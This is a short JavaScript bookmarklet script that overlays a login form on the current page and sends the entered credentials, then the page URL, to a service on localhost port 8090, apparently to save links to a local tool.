(function () {
    var ident = 'ergGERGgerb543Vtrgf23_fewRRGTR534PF',
        formId = ident + '_form';
        toRemove = document.getElementById(ident),
        params = {user:undefined,password:undefined},
        create = function () {
            var bg = document.createElement('div'),
                form = document.createElement('div'),
                user = document.createElement('input'),
                pass = document.createElement('input'),
                submit = document.createElement('input'),                
                destroy = function () {
                    document.body.removeChild(form);
                    document.body.removeChild(bg);
                };

            bg.style.cssText = 'position:fixed; top:0px; left:0; padding:0; margin:0; width: 100%; height:100%; background:#fff; opacity:0.1; z-index:1000000000;';
            form.style.cssText = 'position:fixed; top:10px; left:50%; padding:5px; margin: 0 0 0 -150px; width: 300px; background:#fff; box-shadow: 0 0 10px #000; border-radius:5px; z-index:1000000000;';
            user.style.cssText = pass.style.cssText = submit.style.cssText = 'width: 100%; margin:0 0 10px; padding:0;';
            user.setAttribute('placeholder', 'Username');
            pass.setAttribute('placeholder', 'Password');
            pass.type = 'password';
            submit.type = 'submit';
            submit.onclick = function () {
                var username = user.value,
                    password = pass.value;
                if (username.length > 0 && password.length > 0) {
                    params.user = username;
                    params.password = password;
                    sendRequest('http://127.0.0.1:8090/auth');
                    destroy();
                }
            }
            bg.onclick = function () {
                destroy();
            }
            form.id = formId;
            form.appendChild(user);
            form.appendChild(pass);
            form.appendChild(submit);
            document.body.appendChild(bg);
            document.body.appendChild(form);
            user.focus();
        },
        sendRequest = function (to) {
            var xhr=new XMLHttpRequest();
            xhr.withCredentials = true;
            xhr.open("POST", to, true);
            xhr.setRequestHeader("Accept","application/json");
            xhr.setRequestHeader("Content-type","application/json");
            xhr.onreadystatechange = function () {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var resp = JSON.parse(xhr.responseText);
                if (resp) {
                    if (typeof(resp.status) !== 'undefined') {
                        switch (resp.status) {
                            case 0:
                                create();
                            break;
                            case 1:
                                params = {url:window.top.location.href};
                                sendRequest('http://127.0.0.1:8090/set');
                            break;
                        }
                    }
                }
            }};
            xhr.send(JSON.stringify(params));
        };

    document.body.removeChild(toRemove);

    create();
})();